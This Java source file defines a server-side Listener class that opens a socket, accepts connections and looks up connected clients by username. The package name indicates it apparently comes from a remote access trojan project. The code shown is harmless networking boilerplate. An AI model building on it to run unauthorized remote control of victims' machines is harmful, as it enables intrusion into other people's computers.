package net.jrat.core.listener;

import java.net.ServerSocket;
import java.util.ArrayList;
import java.util.List;

import com.google.gson.annotations.Expose;

import net.jrat.core.connection.Connection;
import net.jrat.core.threads.ConnectionListener;

public class Listener
{
	public Thread thread;
	public ServerSocket serverSocket;
	
	@Expose
	public String name;

	@Expose
	public String address;

	@Expose
	public int port;

	@Expose
	public State state;
	
	public List<Connection> connections;
	public ConnectionListener listener;
	
	public Listener(String name, String address, int port) throws Exception
	{
		this.name = name;
		this.address = address;
		this.port = port;

		this.state = State.STOPPED;
		this.setup();
	}
	
	public void setup() throws Exception
	{
		this.serverSocket = new ServerSocket(this.port);
		this.connections = new ArrayList<Connection>();
		
		if(this.state == State.STARTED)
			this.startThread();
	}
	
	public void startThread()
	{
		(this.thread = new Thread((this.listener = new ConnectionListener(this)), "listener#" + this.name)).start();
	}
	
	public void stopThread()
	{
		try
		{
			this.serverSocket.close();
		}
		catch(Exception e) {}
	}
	
	public Connection getConnection(String username)
	{
		for(Connection connection : this.connections)
		{
			if(connection.informations.username.equalsIgnoreCase(username))
				return connection;
		}
		
		return null;
	}
}
